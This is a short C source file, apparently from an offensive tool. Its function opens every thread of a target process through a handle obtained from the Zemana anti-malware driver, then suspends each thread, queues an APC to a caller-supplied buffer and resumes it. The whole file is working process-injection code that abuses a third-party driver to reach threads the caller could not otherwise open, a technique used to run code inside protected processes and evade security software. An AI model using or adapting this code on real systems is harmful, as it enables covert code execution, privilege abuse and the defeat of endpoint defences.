#define _WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "zemana.h"


VOID ThreadBombApc( _In_ HANDLE hDriver, _In_ DWORD ProcessId,
                    _In_ LPVOID ApcBuffer, _In_ LPVOID ApcArgument )
{
  HANDLE        ThreadSnap = NULL;
  THREADENTRY32 ThreadEntr = { 0 };

  ThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, ProcessId);
  if ( ThreadSnap != INVALID_HANDLE_VALUE )
  {
      ThreadEntr.dwSize = sizeof(THREADENTRY32);
      if ( Thread32First(ThreadSnap, &ThreadEntr) ) {
          while ( Thread32Next(ThreadSnap, &ThreadEntr) )
          {
              if ( ProcessId == ThreadEntr.th32OwnerProcessID ) {
                HANDLE hThread = NULL;
                if ( ZemanaOpenThread( hDriver, ThreadEntr.th32ThreadID, &hThread) ) {
                    SuspendThread( hThread );
                    if ( QueueUserAPC( ApcBuffer, hThread, (ULONG_PTR)ApcArgument ) ) {
                      printf("[+] apc successfully queued for %lu\n", ThreadEntr.th32ThreadID);
                    }
                    ResumeThread( hThread );
                    Sleep( 5000 ); // for some reason this fixes most of the "bugs". hrm.
                    ResumeThread( hThread );
                    CloseHandle( hThread );
                };
              };
          };
      };
      CloseHandle( ThreadSnap );
  };
};
